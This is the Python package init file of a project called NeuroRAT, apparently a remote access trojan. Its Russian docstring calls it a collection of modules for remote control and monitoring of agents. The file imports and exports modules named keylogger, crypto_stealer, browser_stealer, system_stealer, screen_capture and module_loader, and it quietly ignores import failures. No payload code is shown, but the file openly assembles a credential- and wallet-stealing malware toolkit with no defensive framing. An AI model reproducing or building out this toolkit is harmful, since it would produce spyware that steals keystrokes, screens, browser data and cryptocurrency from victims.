#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NeuroRAT Agent Modules

Коллекция модулей для удаленного управления и мониторинга агентов.
"""

__version__ = '0.1.0'
__author__ = 'NeuroRAT Team'

# Import modules for easier access
try:
    from . import keylogger
    from . import crypto_stealer
    from . import browser_stealer
    from . import system_stealer
    from . import screen_capture
    from . import swarm_intelligence
    from . import module_loader
    from . import file_manager
except ImportError as e:
    pass

__all__ = [
    'keylogger', 
    'crypto_stealer', 
    'browser_stealer', 
    'system_stealer', 
    'screen_capture', 
    'swarm_intelligence',
    'module_loader',
    'file_manager'
] 